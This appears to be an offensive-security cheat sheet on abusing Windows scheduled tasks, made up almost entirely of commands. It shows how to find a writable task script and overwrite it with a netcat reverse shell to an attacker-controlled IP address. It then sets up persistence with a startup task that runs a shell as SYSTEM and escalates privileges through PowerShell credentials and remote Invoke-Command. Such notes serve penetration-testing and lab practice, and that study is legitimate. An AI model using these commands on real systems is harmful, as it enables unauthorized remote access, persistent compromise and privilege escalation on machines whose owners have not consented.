# Scheduled Tasks

## Example:

    Schtasks /query /tn vulntask /fo list /v

### Worth checking: Task to run, run as user.

    icacls c:\tasks\schtasks.bat (example)

#### Check file permissions on the executable. 

#### If our user has full access (f) or writing permissions, we insert the payload like:

    echo c:\tools\nc64.exe -e cmd.exe ATTACK_IP PORT > C:\tasks\schtasks.bat

### Start a listener, then you got yourself a shell!

## BONUS! Persistence/PrivEsc using scheduled tasks

Persistence

### 1) Create a scheduled task to execute your shell

    schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM

### 2) Run task

    schtasks /run /tn shell

Privilege Escalation

### 1) Create PowerShell objects to store your credentials

    $pw = ConvertTo-SecureString "PASS" -AsPlainText -Force
    $creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)

### 2) Create a scheduled task using our credentials

    Invoke-Command -Computer HOSTNAME -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds

### 3) Run task

    Invoke-Command -Computer HOSTNAME -ScriptBlock { schtasks /run /tn shell } -Credential $creds
